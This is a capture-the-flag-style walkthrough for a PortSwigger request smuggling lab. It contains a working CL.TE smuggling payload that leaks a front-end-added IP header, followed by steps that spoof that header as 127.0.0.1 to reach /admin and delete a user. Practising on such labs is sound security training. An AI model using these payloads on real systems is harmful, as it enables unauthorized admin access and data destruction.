# Lab 10 — Exploiting HTTP request smuggling to reveal front-end request rewriting

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

**Entry point:** `/admin` requires `127.0.0.1`; the front-end rewrites
requests, appending an unknown `X-*-IP` header.

## Solution

1. Capture the rewrite: smuggle an unterminated POST whose long
   `Content-Length` swallows the next real request (the search function
   reflects request content):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

2. The second response echoes the rewritten request — note the real name of
   the `X-*-IP` header.
3. Smuggle an admin request carrying `X-abcdef-Ip: 127.0.0.1` (use the
   header name you captured), then the same with
   `GET /admin/delete?username=carlos` — lab solved.
